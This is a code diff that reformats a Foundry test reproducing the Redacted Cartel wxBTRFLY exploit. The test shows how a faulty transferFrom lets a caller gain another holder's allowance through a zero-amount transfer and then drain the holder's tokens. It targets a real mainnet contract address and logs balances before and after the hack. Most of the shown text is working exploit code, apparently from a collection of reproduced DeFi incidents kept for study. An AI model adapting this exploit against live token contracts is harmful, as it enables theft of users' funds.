@@ -13,23 +13,18 @@ a faulty implementation of standard transferFrom() ERC-20 function in wxBTRFLY t
 */
 
 interface IRedactedCartelSafeERC20 {
+
     function unFreezeToken() external;
     function balanceOf(address account) external view returns (uint256);
     function approve(address spender, uint256 amount) external returns (bool);
-    function allowance(
-        address owner,
-        address spender
-    ) external view returns (uint256);
-    function transferFrom(
-        address sender,
-        address recipient,
-        uint256 amount
-    ) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+
 }
 
 contract RedactedCartelExploit is Test {
-    IRedactedCartelSafeERC20 wxBTRFLY =
-        IRedactedCartelSafeERC20(0x186E55C0BebD2f69348d94C4A27556d93C5Bd36C);
+
+    IRedactedCartelSafeERC20 wxBTRFLY = IRedactedCartelSafeERC20(0x186E55C0BebD2f69348d94C4A27556d93C5Bd36C);
 
     address Alice = 0x9ee1873ba8383B1D4ac459aBd3c9C006Eaa8800A;
     address AliceContract = 0x0f41d34B301E24E549b7445B3f620178bff331be;
@@ -51,24 +46,15 @@ contract RedactedCartelExploit is Test {
         wxBTRFLY.unFreezeToken();
 
         console.log("Before the Exploit !");
-        console.log(
-            "Alice wxBTRFLY Token Balance: ",
-            wxBTRFLY.balanceOf(Alice)
-        );
+        console.log("Alice wxBTRFLY Token Balance: ", wxBTRFLY.balanceOf(Alice));
         console.log("Bob wxBTRFLY Token Balance: ", wxBTRFLY.balanceOf(Bob));
         console.log("--------------------------------------------------");
 
         // Step 1: Alice approves an address to spend wxBTRFLY Token on her behalf
         vm.prank(Alice);
         wxBTRFLY.approve(AliceContract, 89_011_248_549_237_373_700); // wxBTRFLY.balanceOf(Alice)
-        console.log(
-            "wxBTRFLY Allowance of Alice->AliceContract : ",
-            wxBTRFLY.allowance(Alice, AliceContract)
-        );
-        console.log(
-            "wxBTRFLY Allowance of Alice->Bob(Before transferFrom): ",
-            wxBTRFLY.allowance(Alice, Bob)
-        );
+        console.log("wxBTRFLY Allowance of Alice->AliceContract : ", wxBTRFLY.allowance(Alice, AliceContract));
+        console.log("wxBTRFLY Allowance of Alice->Bob(Before transferFrom): ", wxBTRFLY.allowance(Alice, Bob));
 
         /*
             Custom vulnerable transferFrom function of wxBTRFLY token
@@ -85,10 +71,7 @@ contract RedactedCartelExploit is Test {
         vm.prank(Bob);
         //_approve(Alice, Bob, allowance(Alice, AliceContract ).sub(0)
         wxBTRFLY.transferFrom(Alice, AliceContract, 0);
-        console.log(
-            "wxBTRFLY Allowance of Alice->Bob(After transferFrom): ",
-            wxBTRFLY.allowance(Alice, Bob)
-        );
+        console.log("wxBTRFLY Allowance of Alice->Bob(After transferFrom): ", wxBTRFLY.allowance(Alice, Bob));
 
         //post-hack
         vm.prank(Bob);
@@ -96,10 +79,8 @@ contract RedactedCartelExploit is Test {
 
         console.log("--------------------------------------------------");
         console.log("After the Exploit !");
-        console.log(
-            "Alice wxBTRFLY Token Balance: ",
-            wxBTRFLY.balanceOf(Alice)
-        );
+        console.log("Alice wxBTRFLY Token Balance: ", wxBTRFLY.balanceOf(Alice));
         console.log("Bob wxBTRFLY Token Balance: ", wxBTRFLY.balanceOf(Bob));
     }
+
 }
